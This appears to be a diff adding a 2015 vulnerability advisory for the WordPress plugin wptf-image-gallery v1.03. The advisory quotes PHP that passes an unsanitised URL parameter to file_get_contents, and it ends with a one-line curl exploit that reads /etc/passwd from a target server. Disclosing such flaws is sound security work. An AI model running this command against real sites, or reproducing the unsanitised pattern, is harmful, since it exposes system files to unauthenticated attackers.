@@ -1,0 +1,24 @@
+Title: Remote file download vulnerability in wptf-image-gallery v1.03
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-17
+Download Site: https://wordpress.org/plugins/wptf-image-gallery
+Vendor: https://profiles.wordpress.org/sakush100/
+Vendor Notified: 0000-00-00
+Vendor Contact: plugins@wordpress.org
+Description: WordPress True Fullscreen (WPTF) Gallery is a modern gallery plugin that supports true fullscreen and have a lot of features built with it.
+Vulnerability:
+  The ./wptf-image-gallery/lib-mbox/ajax_load.php code doesn't sanitize user input or check that a user is authorized to download files.  This allows an unauthenticated user to download sensitive system files: 
+
+
+  1 <?php
+  2 error_reporting(0);
+  3 $homepage = file_get_contents($_GET['url']);
+  4 $homepage = str_replace("script", "mboxdisablescript", $homepage);
+  5 $homepage = str_replace("SCRIPT", "mboxdisablescript", $homepage);
+  6 echo $homepage;
+  7 ?>
+
+CVEID:
+OSVDB:
+Exploit Code:
+  • $ curl http://server/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=/etc/passwd
